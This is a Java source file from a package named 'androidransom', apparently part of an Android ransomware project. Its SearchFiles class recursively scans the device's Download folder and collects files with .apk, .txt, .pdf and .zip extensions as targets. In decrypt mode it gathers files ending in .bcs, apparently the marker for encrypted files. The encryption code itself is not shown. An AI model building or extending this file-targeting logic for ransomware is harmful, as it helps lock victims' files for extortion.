package bycracks.androidransom;

import android.os.Environment;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by ByeongCheol on 2017-06-27.
 */

public class SearchFiles {
    final String defaultDir = "/../storage/emulated/0/Download";
    final String[] ext1 = {".apk", ".txt", ".pdf", ".zip"/*, ".hwp", ".ppt", ".pptx", ".jpg", ".jpeg"*/};
    final String[] ext2 = {".bcs"};
    ArrayList<File> fileList;

    SearchFiles() {
        fileList = new ArrayList<File>();
    }

    public File getTopDir() {
        String rootSD = Environment.getRootDirectory().toString();
        return new File(rootSD + defaultDir);
    }

    // 파일 검색
    public ArrayList<File> searchAllFile(File topDir, boolean decrypt) {
        File[] files = topDir.listFiles();
        String[] ext;
        if (files == null) return null;

        // decrypt 면 .bcs 파일만 서칭,
        if (decrypt) ext = ext2;
        else ext = ext1;

        for (File inFile : files) {
            if (inFile.isDirectory()) {
                searchAllFile(inFile, decrypt);
            }
            for (String list : ext)
                if (inFile.getName().endsWith(list))
                    fileList.add(inFile);

        }

        return fileList;
    }

}
